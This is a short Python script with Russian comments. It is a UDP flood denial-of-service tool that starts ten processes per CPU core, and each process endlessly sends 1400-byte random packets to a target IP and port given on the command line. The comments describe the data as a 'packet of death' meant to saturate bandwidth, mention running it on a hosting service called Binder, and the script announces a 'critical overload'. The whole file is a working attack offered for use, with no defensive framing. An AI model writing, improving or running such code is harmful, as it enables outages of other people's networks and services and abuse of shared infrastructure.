import socket
import sys
import multiprocessing
import os

# Пакет "смерти" — 1400 байт случайного мусора. 
# Это забивает канал (bandwidth) максимально быстро.
def extreme_flood(ip, port):
    # Создаем сокет один раз для процесса
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # Генерируем "тяжелую" нагрузку заранее, чтобы не тратить CPU в цикле
    payload = os.urandom(1400)
    
    # Жесткий цикл без проверок — только отправка
    while True:
        try:
            sock.sendto(payload, (ip, port))
        except:
            # Если сетевой стек переполнен, просто продолжаем
            pass

if __name__ == "__main__":
    if len(sys.argv) < 3:
        sys.exit()

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])

    # Определяем количество ядер процессора (на Binder обычно 1-2, но мы задействуем всё)
    cores = multiprocessing.cpu_count()
    
    processes = []
    # Запускаем по 10 агрессивных процессов на каждое ядро
    for _ in range(cores * 10):
        p = multiprocessing.Process(target=extreme_flood, args=(target_ip, target_port))
        p.daemon = True
        p.start()
        processes.append(p)

    print(f"[*] CRITICAL OVERLOAD STARTED ON {target_ip}:{target_port}")
    
    # Держим основной процесс живым
    for p in processes:
        p.join()
